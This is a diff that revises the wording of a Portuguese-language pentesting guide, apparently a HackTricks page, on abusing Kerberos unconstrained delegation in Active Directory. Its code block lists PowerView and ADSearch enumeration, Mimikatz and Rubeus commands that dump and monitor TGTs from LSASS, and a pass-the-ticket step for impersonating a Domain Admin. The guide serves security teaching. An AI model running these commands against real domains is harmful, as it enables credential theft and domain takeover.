@@ -4,7 +4,7 @@
 
 ## Delegação inconstrangida
 
-Esta é uma funcionalidade que um Administrador de Domínio pode definir para qualquer **Computador** dentro do domínio. Assim, sempre que um **usuário fizer login** no Computador, uma **cópia do TGT** desse usuário será **enviada dentro do TGS** fornecido pelo DC **e salva na memória no LSASS**. Portanto, se você tiver privilégios de Administrador na máquina, poderá **extrair os tickets e se passar pelos usuários** em qualquer máquina.
+Esta é uma funcionalidade que um Administrador de Domínio pode definir para qualquer **Computador** dentro do domínio. Assim, sempre que um **usuário faz login** no Computador, uma **cópia do TGT** desse usuário será **enviada dentro do TGS** fornecido pelo DC **e salva na memória no LSASS**. Portanto, se você tiver privilégios de Administrador na máquina, poderá **extrair os tickets e se passar pelos usuários** em qualquer máquina.
 
 Assim, se um administrador de domínio fizer login em um Computador com a funcionalidade "Delegação Inconstrangida" ativada, e você tiver privilégios de administrador local nessa máquina, poderá extrair o ticket e se passar pelo Administrador de Domínio em qualquer lugar (privesc de domínio).
 
@@ -17,11 +17,11 @@ Get-NetComputer -Unconstrained #DCs sempre aparecem, mas não são úteis para p
 </strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
 <strong># Exportar tickets com Mimikatz
 </strong>privilege::debug
-sekurlsa::tickets /export #Forma recomendada
-kerberos::list /export #Outra forma
+sekurlsa::tickets /export #Método recomendado
+kerberos::list /export #Outro método
 
 # Monitorar logins e exportar novos tickets
-.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Verificar a cada 10s por novos TGTs</code></pre>
+.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Verifique a cada 10s por novos TGTs</code></pre>
 
 Carregue o ticket de Administrador (ou usuário vítima) na memória com **Mimikatz** ou **Rubeus para um** [**Pass the Ticket**](pass-the-ticket.md)**.**\
 Mais informações: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
